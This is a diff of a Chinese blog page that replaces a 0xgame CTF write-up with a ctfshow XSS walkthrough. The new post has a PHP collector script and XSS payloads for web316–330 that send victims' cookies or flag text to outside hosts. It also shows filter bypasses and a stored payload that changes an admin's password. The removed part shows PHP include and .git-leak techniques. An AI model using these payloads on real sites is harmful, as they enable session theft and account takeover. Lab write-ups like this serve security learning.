@@ -16,28 +16,27 @@
   <meta name="author" content="Englobe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="web[Week 1] signin信息收集，查看源码发现assets&#x2F;index-33309f51.js，打开后在页面最底部可发现一个sourceMappingURL&#x3D;index-33309f51.js.map,猜测可能是sourcemap文件泄露 &#x2F;assets&#x2F;index-33309f51.js.map下载文件，找到flag [Week 1] baby_php1234567891011121">
+    <meta name="description" content="ctfshow xss做题前需要搭建网站接收flag 2.php代码如下 123456&lt;?php $flag&#x3D;$_GET[&amp;#x27;c&amp;#x27;];$file&#x3D;fopen(&amp;#x27;flag.txt&amp;#x27;,&amp;#x27;w+&amp;#x27;);fwrite($file,$flag);fclose($file);?&gt;  接收GET传来的参数，并写在flag.php中 xss总结 w">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0xgame-2023">
-<meta property="og:url" content="http://example.com/2023/10/07/%E6%AF%94%E8%B5%9B/0xgame-2023/index.html">
+<meta property="og:title" content="ctfshow xss">
+<meta property="og:url" content="http://example.com/2023/10/22/ctfshow/ctfshow%20xss/index.html">
 <meta property="og:site_name" content="Englobe blog">
-<meta property="og:description" content="web[Week 1] signin信息收集，查看源码发现assets&#x2F;index-33309f51.js，打开后在页面最底部可发现一个sourceMappingURL&#x3D;index-33309f51.js.map,猜测可能是sourcemap文件泄露 &#x2F;assets&#x2F;index-33309f51.js.map下载文件，找到flag [Week 1] baby_php1234567891011121">
+<meta property="og:description" content="ctfshow xss做题前需要搭建网站接收flag 2.php代码如下 123456&lt;?php $flag&#x3D;$_GET[&amp;#x27;c&amp;#x27;];$file&#x3D;fopen(&amp;#x27;flag.txt&amp;#x27;,&amp;#x27;w+&amp;#x27;);fwrite($file,$flag);fclose($file);?&gt;  接收GET传来的参数，并写在flag.php中 xss总结 w">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.imgs.ovh/2023/10/13/X8gCH.png">
-<meta property="og:image" content="https://i.imgs.ovh/2023/10/13/X8UH5.png">
-<meta property="og:image" content="https://i.imgs.ovh/2023/10/13/X852U.png">
-<meta property="article:published_time" content="2023-10-07T14:03:40.000Z">
-<meta property="article:modified_time" content="2023-10-13T13:48:45.257Z">
+<meta property="og:image" content="https://i.imgs.ovh/2023/10/22/2dpKu.png">
+<meta property="og:image" content="https://i.imgs.ovh/2023/10/22/2day2.png">
+<meta property="article:published_time" content="2023-10-22T11:44:48.000Z">
+<meta property="article:modified_time" content="2023-10-22T14:11:10.867Z">
 <meta property="article:author" content="Englobe">
-<meta property="article:tag" content="比赛">
+<meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.imgs.ovh/2023/10/13/X8gCH.png">
+<meta name="twitter:image" content="https://i.imgs.ovh/2023/10/22/2dpKu.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>0xgame-2023 - Englobe blog</title>
+  <title>ctfshow xss - Englobe blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="0xgame-2023"></span>
+            <span id="subtitle" data-typed-text="ctfshow xss"></span>
           
         </div>
 
@@ -214,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-07 22:03" pubdate>
-          2023年10月7日 晚上
+        <time datetime="2023-10-22 19:44" pubdate>
+          2023年10月22日 晚上
         </time>
       </span>
     
@@ -226,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          1.9k 字
         
       </span>
     
@@ -237,7 +236,7 @@
         
         
         
-          11 分钟
+          16 分钟
         
       </span>
     
@@ -283,51 +282,53 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">0xgame-2023</h1>
+            <h1 style="display: none">ctfshow xss</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>信息收集，查看源码发现<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p>
-<p><code>/assets/index-33309f51.js.map</code>下载文件，找到flag</p>
-<h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>      <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="ctfshow-xss"><a href="#ctfshow-xss" class="headerlink" title="ctfshow xss"></a>ctfshow xss</h1><p>做题前需要搭建网站接收flag</p>
+<p>2.php代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$flag</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>payload：</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://120.27.148.152:50014/?a</span>[<span class="hljs-string"></span>]=1&amp;b[]=2<br></code></pre></td></tr></table></figure>
+<p>接收GET传来的参数，并写在flag.php中</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">xss总结</a></p>
+<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://47.115.224.235/2.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>Post: c&#x3D;1024.1a</p>
-<p>Cookie: name&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</p>
-<h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>get方式传参</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">120.27</span>.<span class="hljs-number">148.152</span>:<span class="hljs-number">50012</span>/?query=ctf<br></code></pre></td></tr></table></figure>
+<p>打开flag.php，得到flag</p>
+<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>过滤了script</p>
+<p>利用body标签</p>
+<p>由于这种攻击方法向量，在给定页面中只有一个body标签，有些人可能认为它不起作用，但实际上，所有浏览器都会把它当事件处理器（Event Handler）来执行。在这里，可以在onpageshow事件中用提交body元素的方法，形成XSS Payload，当其中的body元素被解析后就会触发Payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>post方式传参</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">action</span><span class="hljs-operator">=</span>getflag<br></code></pre></td></tr></table></figure>
+<h2 id="web318，319"><a href="#web318，319" class="headerlink" title="web318，319"></a>web318，319</h2><p>过滤了img，payload与317相同</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>更改Cookie</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Cookie: <span class="hljs-keyword">role</span>=<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure>
+<h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>过滤空格，使用&#x2F;绕过</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;body/onload=&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;&gt;<br></code></pre></td></tr></table></figure>
 
-<p>加XFF头</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
+<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><img src="https://i.imgs.ovh/2023/10/22/2dpKu.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发件人和收件人都要填写admin，否则会发送失败</p>
+<p>信的内容填写payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>改UA头</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: HarmonyOS Browser<br></code></pre></td></tr></table></figure>
+<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>注册账号，账号中填写payload语句，用这个账号登陆</p>
+<p>后台管理员查看登录界面时，会执行js代码，将管理员cookie发出去</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>改Referer</p>
-<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> ys.mihoyo.com<br></code></pre></td></tr></table></figure>
+<p>得到cookie后，bp抓包修改得到权限，可以查看flag</p>
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>该题得到cookie会快速失效，因此换一种姿势，我们的xss代码会在用户管理里执行，可以直接把flag发到我们服务器里</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index,value</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span>)==<span class="hljs-number">0</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;</span>+value.<span class="hljs-property">innerHTML</span>; </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>得到flag</p>
-<h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>python2 GitHack.py <a target="_blank" rel="noopener" href="http://120.27.148.152:50013/.git">http://120.27.148.152:50013/.git</a></p>
-<p><img src="https://i.imgs.ovh/2023/10/13/X8gCH.png" srcset="/img/loading.gif" lazyload alt="X8gCH.png"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/COCOLI_BK/article/details/103344407">https://blog.csdn.net/COCOLI_BK/article/details/103344407</a></p>
-<p><code>git log</code></p>
-<p><code>git reflog</code></p>
-<p>查看历史版本</p>
-<p><img src="https://i.imgs.ovh/2023/10/13/X8UH5.png" srcset="/img/loading.gif" lazyload alt="X8UH5.png"></p>
-<p><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b</code></p>
-<p>切换至有flag的版本</p>
-<p><img src="https://i.imgs.ovh/2023/10/13/X852U.png" srcset="/img/loading.gif" lazyload alt="X852U.png"></p>
-<p><code>grep -r  &quot;flag&quot; ./</code></p>
-<p>当前目录匹配含flag文件</p>
+<p>indexof 方法<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/jsref_indexOf.asp">https://www.w3school.com.cn/jsref/jsref_indexOf.asp</a></p>
+<h2 id="web-330"><a href="#web-330" class="headerlink" title="web 330"></a>web 330</h2><p><img src="https://i.imgs.ovh/2023/10/22/2day2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>借用修改密码界面尝试修改管理员密码</p>
+<p>在用户名触发script语句</p>
+<p>注册账号用户名填payload，密码123</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>用这个账号和密码去登录一下。登录完成后，管理员admin的密码就被成功修改成123了，此时即可成功登录。</p>
 
                 
               </div>
@@ -346,7 +347,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  <a href="/categories/ctfshow/" class="category-chain-item">ctfshow</a>
   
   
 
@@ -361,7 +362,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%AF%94%E8%B5%9B/">#比赛</a>
+        <a href="/tags/ctfshow/">#ctfshow</a>
       
     </div>
   
@@ -373,8 +374,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>0xgame-2023</div>
-      <div>http://example.com/2023/10/07/比赛/0xgame-2023/</div>
+      <div>ctfshow xss</div>
+      <div>http://example.com/2023/10/22/ctfshow/ctfshow xss/</div>
     </div>
     <div class="license-meta">
       
@@ -386,7 +387,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月7日</div>
+          <div>2023年10月22日</div>
         </div>
       
       
@@ -418,9 +419,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/18/ctfshow/ctfshow%20ssrf/" title="ctfshow ssrf">
+                      <a href="/2023/10/22/xss/" title="ctfshow xss">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ctfshow ssrf</span>
+                        <span class="hidden-mobile">ctfshow xss</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -428,8 +429,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/27/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/" title="常用知识点">
-                        <span class="hidden-mobile">常用知识点</span>
+                      <a href="/2023/10/18/ctfshow/ctfshow%20ssrf/" title="ctfshow ssrf">
+                        <span class="hidden-mobile">ctfshow ssrf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
